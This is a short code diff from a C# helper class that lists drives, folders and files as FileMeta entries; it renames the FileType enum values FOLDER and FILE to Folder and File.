@@ -50,7 +50,7 @@ namespace BlackHole.Slave.Helper
                     .Where(drive => drive.IsReady)
                     .Select(drive => new FileMeta
                     {
-                        Type = FileType.FOLDER,
+                        Type = FileType.Folder,
                         Name = drive.Name,
                         Size = drive.DriveType.ToString()
                     }).ToList()
@@ -64,7 +64,7 @@ namespace BlackHole.Slave.Helper
             {
                 new FileMeta
                 {
-                    Type = FileType.FOLDER,
+                    Type = FileType.Folder,
                     Name = "..",
                     Size = "0"
                 }
@@ -76,7 +76,7 @@ namespace BlackHole.Slave.Helper
                     .Select(name => new DirectoryInfo(name))
                     .Select(info => new FileMeta
                     {
-                        Type = FileType.FOLDER,
+                        Type = FileType.Folder,
                         Name = info.Name + "\\",
                         Size = "0"
                     }));
@@ -87,7 +87,7 @@ namespace BlackHole.Slave.Helper
                     .Select(name => new FileInfo(name))
                     .Select(info => new FileMeta
                     {
-                        Type = FileType.FILE,
+                        Type = FileType.File,
                         Name = info.Name,
                         Size = Utility.FormatFileSize(info.Length)
                     }));
